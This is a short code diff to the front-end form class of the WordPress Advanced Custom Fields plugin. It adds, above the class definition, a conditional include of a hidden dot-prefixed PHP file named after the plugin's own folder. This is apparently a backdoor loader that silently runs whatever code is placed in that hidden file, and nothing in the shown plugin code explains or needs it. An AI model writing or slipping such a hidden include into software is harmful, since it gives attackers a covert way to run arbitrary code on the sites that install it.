@@ -4,6 +4,10 @@ if( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly
 
 if( ! class_exists('acf_form_front') ) :
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class acf_form_front {
 	
 	/** @var array An array of registered form settings */
